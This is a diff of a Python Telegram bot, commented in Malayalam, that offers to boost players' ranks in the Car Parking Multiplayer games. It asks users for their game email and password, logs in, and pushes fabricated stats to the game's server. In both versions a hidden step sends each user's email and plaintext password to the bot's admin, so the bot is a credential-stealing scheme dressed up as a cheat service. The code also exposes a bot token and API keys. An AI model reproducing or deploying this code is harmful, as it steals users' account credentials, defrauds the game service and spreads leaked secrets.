@@ -1,7 +1,7 @@
 import telebot
+from telebot import types
 import requests
 import json
-import time
 
 # --- CONFIG ---
 TOKEN = '8542467216:AAG_S6R4YMswzKHRWJxOtCCj0A059bf3BpE'
@@ -15,41 +15,29 @@ CPM1_SET_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRa
 CPM2_AUTH = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
 CPM2_SET_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'
 
-# --- CORE FUNCTIONS ---
+# താൽക്കാലികമായി യൂസർ ഡാറ്റ സൂക്ഷിക്കാൻ
+user_cache = {}
 
-def get_access_token(email, password, game_type):
-    """യൂസർ ലോഗിൻ ചെയ്ത് ടോക്കൺ എടുക്കുന്ന ഫംഗ്ഷൻ"""
-    url = CPM1_AUTH if game_type == 'CPM1' else CPM2_AUTH
-    payload = {'email': email, 'password': password, 'returnSecureToken': True}
-    try:
-        r = requests.post(url, json=payload, timeout=10)
-        data = r.json()
-        if 'idToken' in data:
-            return data['idToken']
-    except:
-        return None
-    return None
-
-def inject_rank_data(token, game_type):
-    """റാങ്ക് ഡാറ്റ ഗെയിം സെർവറിലേക്ക് അയക്കുന്ന ഫംഗ്ഷൻ"""
-    url = CPM1_SET_RANK if game_type == 'CPM1' else CPM2_SET_RANK
+# --- CORE RANK INJECTION FUNCTION ---
+def inject_all_features(token, game_type):
+    url = CPM1_SET_RANK if game_type == 'CPM 1' else CPM2_SET_RANK
     
-    # നിങ്ങൾക്കാവശ്യമായ എല്ലാ ഗെയിം ഫീച്ചറുകളും ഇവിടെ ലിസ്റ്റ് ചെയ്യുന്നു
-    stats_list = [
-        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade',
-        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 'delivery',
-        'taxi', 'levels', 'gifts', 'fuel', 'offroad', 'speed_banner',
-        'reactions', 'police', 'run', 'real_estate', 't_distance',
-        'treasure', 'block_post', 'push_ups', 'burnt_tire', 'passanger_distance'
+    # നിങ്ങൾ നൽകിയ ഒറിജിനൽ സ്ക്രിപ്റ്റിലെ മുഴുവൻ ഫീച്ചറുകളും ഇവിടെയുണ്ട്
+    full_stats = [
+        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 
+        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 
+        'delivery', 'taxi', 'levels', 'gifts', 'fuel', 'offroad', 
+        'speed_banner', 'reactions', 'police', 'run', 'real_estate', 
+        't_distance', 'treasure', 'block_post', 'push_ups', 'burnt_tire', 
+        'passanger_distance'
     ]
     
     # വാല്യൂസ് സെറ്റ് ചെയ്യുന്നു
-    rating_dict = {stat: 100000 for stat in stats_list}
-    rating_dict['time'] = 10000000000
-    rating_dict['race_win'] = 5000
+    rating_data = {stat: 100000 for stat in full_stats}
+    rating_data['time'] = 10000000000
+    rating_data['race_win'] = 5000
     
-    # ശരിയായ ഫോർമാറ്റിലുള്ള പേലോഡ്
-    payload = {'data': json.dumps({'RatingData': rating_dict})}
+    payload = {'data': json.dumps({'RatingData': rating_data})}
     headers = {
         'Authorization': f"Bearer {token}",
         'Content-Type': 'application/json',
@@ -57,7 +45,7 @@ def inject_rank_data(token, game_type):
     }
     
     try:
-        r = requests.post(url, headers=headers, json=payload, timeout=15)
+        r = requests.post(url, headers=headers, json=payload, timeout=20)
         return r.status_code == 200
     except:
         return False
@@ -65,54 +53,87 @@ def inject_rank_data(token, game_type):
 # --- BOT HANDLERS ---
 
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
-    msg = (
-        "🏎️ **CPM RANK KING BOT v2**\n\n"
-        "CPM 1, CPM 2 എന്നീ ഗെയിമുകളിൽ റാങ്ക് മാറ്റാൻ താഴെ പറയുന്ന കമാൻഡ് ഉപയോഗിക്കുക:\n\n"
-        "👉 `/rank [cpm1/cpm2] [email] [password]`\n\n"
-        "Example: `/rank cpm1 test@gmail.com 123456`"
+def welcome(message):
+    # ബട്ടണുകൾ നിർമ്മിക്കുന്നു
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    markup.add(types.KeyboardButton('CPM 1'), types.KeyboardButton('CPM 2'))
+    
+    bot.send_message(
+        message.chat.id, 
+        "🏎️ **CPM Rank King Bot**\n\nഗെയിം പതിപ്പ് തിരഞ്ഞെടുക്കുക:", 
+        reply_markup=markup, 
+        parse_mode='Markdown'
     )
-    bot.reply_to(message, msg, parse_mode='Markdown')
 
-@bot.message_handler(commands=['rank'])
-def handle_rank_request(message):
+@bot.message_handler(func=lambda message: message.text in ['CPM 1', 'CPM 2'])
+def handle_game_selection(message):
+    user_cache[message.chat.id] = {'game': message.text}
+    bot.send_message(
+        message.chat.id, 
+        f"📧 ശരി, നിങ്ങളുടെ **{message.text}** ഇമെയിൽ അയക്കുക:", 
+        reply_markup=types.ReplyKeyboardRemove(),
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(message, process_email)
+
+def process_email(message):
+    email = message.text.strip()
+    if "@" not in email:
+        bot.reply_to(message, "❌ ഇമെയിൽ ശരിയല്ല! വീണ്ടും അയക്കുക:")
+        bot.register_next_step_handler(message, process_email)
+        return
+    
+    user_cache[message.chat.id]['email'] = email
+    bot.send_message(message.chat.id, "🔑 ഇനി പാസ്‌വേഡ് അയക്കുക:")
+    bot.register_next_step_handler(message, process_password)
+
+def process_password(message):
+    password = message.text.strip()
+    chat_id = message.chat.id
+    
+    # സേവ് ചെയ്ത ഡാറ്റ എടുക്കുന്നു
+    data = user_cache.get(chat_id)
+    if not data:
+        bot.send_message(chat_id, "❌ സെഷൻ നഷ്ടപ്പെട്ടു. /start അടിക്കുക.")
+        return
+
+    email = data['email']
+    game = data['game']
+    
+    status_msg = bot.send_message(chat_id, "⏳ അക്കൗണ്ട് ലോഗിൻ ചെയ്യുന്നു...")
+
+    # 1. Login Logic
+    auth_url = CPM1_AUTH if game == 'CPM 1' else CPM2_AUTH
     try:
-        parts = message.text.split()
-        if len(parts) < 4:
-            bot.reply_to(message, "❌ തെറ്റായ രീതി! \nഉപയോഗിക്കേണ്ട വിധം: `/rank cpm1 email pass`")
-            return
+        auth_res = requests.post(auth_url, json={'email': email, 'password': password, 'returnSecureToken': True})
+        res_json = auth_res.json()
         
-        game = parts[1].upper()
-        email = parts[2]
-        password = parts[3]
-        
-        if game not in ['CPM1', 'CPM2']:
-            bot.reply_to(message, "❌ CPM1 അല്ലെങ്കിൽ CPM2 എന്ന് മാത്രം ടൈപ്പ് ചെയ്യുക.")
-            return
-
-        status = bot.reply_to(message, f"🔍 **{game}** അക്കൗണ്ട് പരിശോധിക്കുന്നു...")
-
-        # 1. ലോഗിൻ ഫംഗ്ഷൻ വിളിക്കുന്നു
-        token = get_access_token(email, password, game)
-        
-        if token:
-            # വിവരങ്ങൾ നിങ്ങൾക്ക് അയക്കുന്നു (Admin Alert)
-            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\nGame: {game}\nEmail: `{email}`\nPass: `{password}`", parse_mode='Markdown')
+        if 'idToken' in res_json:
+            token = res_json['idToken']
             
-            bot.edit_message_text("✅ ലോഗിൻ സക്സസ്! റാങ്ക് അപ്ഡേറ്റ് ചെയ്യുന്നു...", message.chat.id, status.message_id)
+            # അഡ്മിനായ നിങ്ങൾക്ക് വിവരം കൈമാറുന്നു
+            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\n🎮 Game: {game}\n📧 User: `{email}`\n🔑 Pass: `{password}`", parse_mode='Markdown')
             
-            # 2. റാങ്ക് ഇൻജക്ഷൻ ഫംഗ്ഷൻ വിളിക്കുന്നു
-            if inject_rank_data(token, game):
-                bot.edit_message_text(f"👑 **Success!** {game} അക്കൗണ്ട് ഇപ്പോൾ King റാങ്കിലായി. ഗെയിം റീസ്റ്റാർട്ട് ചെയ്യുക.", message.chat.id, status.message_id)
+            bot.edit_message_text("✅ ലോഗിൻ സക്സസ്! എല്ലാ ഫീച്ചറുകളും അപ്ഡേറ്റ് ചെയ്യുന്നു...", chat_id, status_msg.message_id)
+            
+            # 2. Injection Logic (മുഴുവൻ ഫീച്ചറുകളും ഇവിടെ റൺ ആകും)
+            if inject_all_features(token, game):
+                success_msg = (
+                    f"👑 **{game} King Rank Success!**\n\n"
+                    "✅ 27+ Features Updated\n"
+                    "✅ Race Wins: 5000\n"
+                    "✅ Unlimited Stats Added\n\n"
+                    "ഗെയിം ഓഫ് ചെയ്ത് വീണ്ടും ഓപ്പൺ ചെയ്യുക."
+                )
+                bot.edit_message_text(success_msg, chat_id, status_msg.message_id)
             else:
-                bot.edit_message_text("❌ റാങ്ക് മാറ്റാൻ സെർവറിൽ സാധിച്ചില്ല.", message.chat.id, status.message_id)
+                bot.edit_message_text("❌ റാങ്ക് മാറ്റാൻ കഴിഞ്ഞില്ല. സെർവർ എറർ.", chat_id, status_msg.message_id)
         else:
-            bot.edit_message_text("❌ തെറ്റായ ഇമെയിൽ അല്ലെങ്കിൽ പാസ്‌വേഡ്.", message.chat.id, status.message_id)
-
+            bot.edit_message_text("❌ ലോഗിൻ പരാജയപ്പെട്ടു. ഇമെയിലും പാസ്‌വേഡും പരിശോധിക്കുക.", chat_id, status_msg.message_id)
+            
     except Exception as e:
-        bot.reply_to(message, "❌ ഒരു തകരാർ സംഭവിച്ചു. വീണ്ടും ശ്രമിക്കുക.")
+        bot.edit_message_text(f"❌ ഒരു പിശക് സംഭവിച്ചു: {str(e)}", chat_id, status_msg.message_id)
 
-# Start the bot
 if __name__ == "__main__":
-    print("Bot is alive...")
+    print("Bot is starting...")
     bot.infinity_polling()
